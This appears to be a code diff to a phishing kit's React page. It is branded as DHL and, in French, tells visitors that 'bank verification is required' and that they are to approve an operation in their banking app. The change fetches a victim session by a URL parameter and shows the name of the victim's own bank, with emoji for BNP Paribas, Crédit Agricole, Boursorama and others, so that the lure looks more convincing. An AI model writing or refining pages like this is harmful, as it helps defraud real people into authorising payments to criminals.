@@ -4,50 +4,87 @@ import { Building2, Smartphone, CheckCircle2 } from "lucide-react";
 
 export default function DHLApprovePage() {
   const [dots, setDots] = useState(".");
+  const [bankName, setBankName] = useState("Votre Banque");
+  const [bankFlag, setBankFlag] = useState("🏦");
+
+  // Bank flags mapping
+  const getBankFlag = (name: string): string => {
+    const flags: Record<string, string> = {
+      "BNP Paribas": "🏦",
+      "Crédit Agricole": "🌾",
+      "Société Générale": "🏛️",
+      "Crédit Mutuel": "💚",
+      "LCL": "💙",
+      "Caisse d'Épargne": "🐿️",
+      "La Banque Postale": "📮",
+      "Boursorama": "🦁",
+      "Visa": "💳",
+      "Mastercard": "💳",
+      "American Express": "💳",
+    };
+    return flags[name] || "🏦";
+  };
 
   useEffect(() => {
     const interval = setInterval(() => {
       setDots((prev) => (prev.length >= 3 ? "." : prev + "."));
     }, 500);
 
+    // Get bank name from URL or localStorage
+    const params = new URLSearchParams(window.location.search);
+    const sessionId = params.get("session");
+    
+    if (sessionId) {
+      fetch(`/api/dhl/session/${sessionId}`)
+        .then(res => res.json())
+        .then(data => {
+          if (data.bankName) {
+            setBankName(data.bankName);
+            setBankFlag(getBankFlag(data.bankName));
+          }
+        })
+        .catch(() => {});
+    }
+
     return () => clearInterval(interval);
   }, []);
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 flex items-center justify-center p-4">
-      <Card className="w-full max-w-md shadow-xl border-2 border-blue-500">
-        <CardHeader className="space-y-4 text-center bg-gradient-to-r from-blue-600 to-indigo-600 text-white pb-8">
+    <div className="min-h-screen bg-gradient-to-br from-green-50 to-emerald-50 flex items-center justify-center p-4">
+      <Card className="w-full max-w-md shadow-xl border-2 border-green-600">
+        <CardHeader className="space-y-4 text-center bg-gradient-to-r from-green-600 to-emerald-600 text-white pb-8">
           <div className="flex justify-center">
-            <div className="bg-white rounded-full p-6 shadow-lg">
-              <Building2 className="h-20 w-20 text-blue-600" />
+            <div className="bg-white rounded-full p-6 shadow-lg" data-testid="bank-logo">
+              <div className="text-6xl">{bankFlag}</div>
             </div>
           </div>
+          <div className="text-3xl font-bold mb-2" data-testid="bank-name">{bankName}</div>
           <CardTitle className="text-2xl font-bold">
             Vérification bancaire requise
           </CardTitle>
           <CardDescription className="text-white/90 text-base">
-            Votre banque demande une confirmation
+            {bankName} demande une confirmation
           </CardDescription>
         </CardHeader>
 
         <CardContent className="pt-8 space-y-6">
-          <div className="bg-blue-50 border-2 border-blue-300 rounded-lg p-6 text-center space-y-4">
+          <div className="bg-green-50 border-2 border-green-300 rounded-lg p-6 text-center space-y-4">
             <div className="flex justify-center">
-              <Smartphone className="h-16 w-16 text-blue-600 animate-pulse" />
+              <Smartphone className="h-16 w-16 text-green-600 animate-pulse" />
             </div>
             
             <div className="space-y-2">
-              <p className="text-lg font-semibold text-blue-900">
+              <p className="text-lg font-semibold text-green-900">
                 Approuvez cette opération sur votre téléphone
               </p>
-              <p className="text-sm text-blue-700">
+              <p className="text-sm text-green-700">
                 Consultez votre application bancaire mobile
               </p>
             </div>
           </div>
 
           <div className="space-y-3">
-            <div className="flex items-start gap-3 p-3 bg-white border border-gray-200 rounded-lg">
+            <div className="flex items-start gap-3 p-3 bg-white border border-green-200 rounded-lg">
               <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
               <div className="text-sm">
                 <p className="font-medium text-gray-900">Étape 1 : Ouvrez votre app bancaire</p>
@@ -55,7 +92,7 @@ export default function DHLApprovePage() {
               </div>
             </div>
 
-            <div className="flex items-start gap-3 p-3 bg-white border border-gray-200 rounded-lg">
+            <div className="flex items-start gap-3 p-3 bg-white border border-green-200 rounded-lg">
               <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
               <div className="text-sm">
                 <p className="font-medium text-gray-900">Étape 2 : Confirmez l'opération</p>
@@ -63,7 +100,7 @@ export default function DHLApprovePage() {
               </div>
             </div>
 
-            <div className="flex items-start gap-3 p-3 bg-white border border-gray-200 rounded-lg">
+            <div className="flex items-start gap-3 p-3 bg-white border border-green-200 rounded-lg">
               <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
               <div className="text-sm">
                 <p className="font-medium text-gray-900">Étape 3 : Attendez la confirmation</p>
